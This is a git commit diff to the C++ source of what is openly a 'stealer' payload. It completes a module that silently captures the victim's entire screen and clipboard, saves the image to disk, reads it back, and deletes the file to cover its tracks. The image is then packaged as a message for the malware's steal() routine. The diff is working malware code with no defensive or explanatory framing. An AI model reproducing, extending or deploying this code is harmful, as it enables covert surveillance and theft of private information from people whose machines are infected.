31af2b1a44e76b951752e0a11b3436dd55bcee45
aniteka <an1teka4@gmail.com>
2024-09-18 02:35:29 +0300

    screenshot done

--- payload/stealers/srceenshot_stealer.cpp
+++ payload/stealers/srceenshot_stealer.cpp
@@ -2,6 +2,13 @@
 
 #include "messages/photo_message.h"
 
+#define max(a, b) (a) > (b) ? (a) : (b)
+#define min(a, b) (a) > (b) ? (b) : (a)
+
+#include "atlimage.h"
+#include "gdiplusimaging.h"
+#include <fstream>
+
 asio::awaitable<std::unique_ptr<message_t>> srceenshot_stealer_t::steal()
 {
     return asio::async_initiate<decltype(asio::use_awaitable), void(std::unique_ptr<message_t>&&)>(
@@ -11,7 +18,6 @@ asio::awaitable<std::unique_ptr<message_t>> srceenshot_stealer_t::steal()
             {
                 int x1, y1, x2, y2, w, h;
 
-                // get screen dimensions
                 x1  = GetSystemMetrics(SM_XVIRTUALSCREEN);
                 y1  = GetSystemMetrics(SM_YVIRTUALSCREEN);
                 x2  = GetSystemMetrics(SM_CXVIRTUALSCREEN);
@@ -19,39 +25,33 @@ asio::awaitable<std::unique_ptr<message_t>> srceenshot_stealer_t::steal()
                 w   = x2 - x1;
                 h   = y2 - y1;
 
-                // copy screen to bitmap
                 HDC     hScreen = GetDC(NULL);
                 HDC     hDC     = CreateCompatibleDC(hScreen);
                 HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, w, h);
                 HGDIOBJ old_obj = SelectObject(hDC, hBitmap);
                 BOOL    bRet    = BitBlt(hDC, 0, 0, w, h, hScreen, x1, y1, SRCCOPY);
 
-                // save bitmap to clipboard
                 OpenClipboard(NULL);
                 EmptyClipboard();
                 SetClipboardData(CF_BITMAP, hBitmap);
                 CloseClipboard();
 
-                /*
-                BITMAP bitmap;
-                GetObject(hBitmap, sizeof(bitmap), (LPVOID)&bitmap);
+                const auto FILE_NAME = "screenshot.jpeg";
 
-                BITMAPINFO MyBMInfo = {0};
-                MyBMInfo.bmiHeader.biSize = sizeof(MyBMInfo.bmiHeader);
-                GetDIBits(hDC, hBitmap, 0, 0, NULL, &MyBMInfo, DIB_RGB_COLORS);
+                // TODO refactor this shit
+                CImage image;
+                image.Attach(hBitmap);
+                image.Save(FILE_NAME);
 
-                BYTE* lpPixels = new BYTE[MyBMInfo.bmiHeader.biSizeImage];
-
-                MyBMInfo.bmiHeader.biCompression = BI_RGB;
-
-                GetDIBits(hDC, hBitmap, 0, MyBMInfo.bmiHeader.biHeight, (LPVOID)lpPixels, &MyBMInfo, DIB_RGB_COLORS);
-*/
+                std::ifstream ifs(FILE_NAME, std::ios::binary);
+                DeleteFile(FILE_NAME);
+                // TODO refactor this shit
 
                 auto to_ret = std::make_unique<photo_message_t>();
                 std::string data;
-                to_ret->move_to_data_and_set_path(data, "screenshot.jpg");
+                data.assign((std::istreambuf_iterator<char>(ifs)), std::istreambuf_iterator<char>());
+                to_ret->move_to_data_and_set_path(data, FILE_NAME);
 
-                // clean up
                 SelectObject(hDC, old_obj);
                 DeleteDC(hDC);
                 ReleaseDC(NULL, hScreen);
